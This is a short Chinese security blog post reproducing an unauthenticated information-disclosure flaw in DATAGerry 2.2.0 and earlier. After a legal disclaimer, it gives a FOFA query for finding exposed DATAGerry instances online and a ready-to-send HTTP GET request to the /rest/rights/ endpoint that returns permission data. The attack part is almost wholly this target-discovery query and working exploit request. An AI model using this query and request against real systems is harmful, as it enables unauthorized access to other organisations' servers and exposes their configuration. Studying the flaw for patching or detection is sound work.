#  漏洞复现 || DATAGerry 终端节点接口敏感信息泄露   
韩文庚  我爱林   2025-02-12 11:19  
  
## 免责声明  
  
**我爱林攻防研究院的技术文章仅供参考，****任何个人和组织使用网络应当遵守宪法法律，遵守公共秩序，尊重社会公德，不得利用网络从事危害国家安全、荣誉和利益****，未经授权请勿利用文章中的技术资料对任何计算机系统进行入侵操作。利用此文所提供的信息而造成的直接或间接后果和损失，均由使用者本人负责。本文所提供的工具仅用于学习，禁止用于其他！！！**  
## 漏洞描述  
  
DATAGerry 2.2.0 及之前版本中的接口中REST API 端点存在未授权访问漏洞，攻击者无需身份验证即可远程访问该端点，导致敏感信息泄露。该漏洞可能暴露用户权限配置等关键数据，进一步引发权限提升或系统完整性破坏。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNyBRl75VjLzuVMmszG4SQt2YLEtAPXibfm4WYK7oibib8hrLw7PwfUDq89vCvYSibSRwR6MSG8F8qaqw/640?wx_fmt=png&from=appmsg "")  
## 资产确定  
```
fofa： icon_hash="505564403" || title="datagerry"
```  
## 漏洞复现  
  
1.利用如下PO  
C  
```
GET /rest/rights/ HTTP/1.1
Host: {{Hostname}}
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/JibM0LyR9LlNyBRl75VjLzuVMmszG4SQtgPkgA8gpia2OV4RSd63eUWUzMYTubWBtS16vnWSB6hbgFic0iaUtt4I6A/640?wx_fmt=png&from=appmsg "")  
  
如有侵权，请联系删除  
  
感谢您抽出  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
.  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
来阅读本文  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
**点它，分享点赞在看都在这里**  
  
